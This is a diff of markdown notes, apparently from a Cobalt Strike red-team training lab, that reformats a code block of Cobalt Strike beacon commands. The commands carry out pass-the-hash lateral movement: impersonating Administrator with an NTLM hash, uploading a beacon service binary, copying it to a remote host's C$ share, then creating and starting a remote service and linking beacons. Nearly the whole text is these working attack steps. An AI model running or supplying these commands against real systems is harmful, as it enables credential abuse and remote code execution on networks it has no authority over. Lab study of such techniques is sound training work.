@@ -32,11 +32,11 @@ beacon> jump winrm64 sql-2.dev.cyberbotic.io Default_SMB_Listener
 
 ### Hash creds - pth
 
-```bash
-beacon> pth DEV\Administrator 59fc0f884922b4ce376051134c71e22c
-// Example beacon spawn
+<pre class="language-bash"><code class="lang-bash"><strong>// Impersonate w/ NTLM (can also use mimikatz ptf w/ steal_token)
+</strong><strong>beacon> pth Administrator 59fc0f884922b4ce376051134c71e22c 
+</strong>// Example beacon spawn
 beacon> upload demo.svc.exe C:\Windows\Temp
-// Copy beacon to remote host & create service
+// Copy beacon to remote host &#x26; create service
 beacon> shell copy C:\Windows\Temp\demo.svc.exe \\172.16.48.121\C$\Windows\Temp
 beacon> shell sc \\172.16.48.121 create demopth binpath=C:\Windows\Temp\demo.svc.exe
 beacon> shell sc \\172.16.48.121 start demopth
@@ -44,6 +44,6 @@ beacon> shell sc \\172.16.48.121 start demopth
 beacon> link 172.16.48.83
 // Drop impoersonation
 beacon> rev2self
-```
+</code></pre>
 
 \
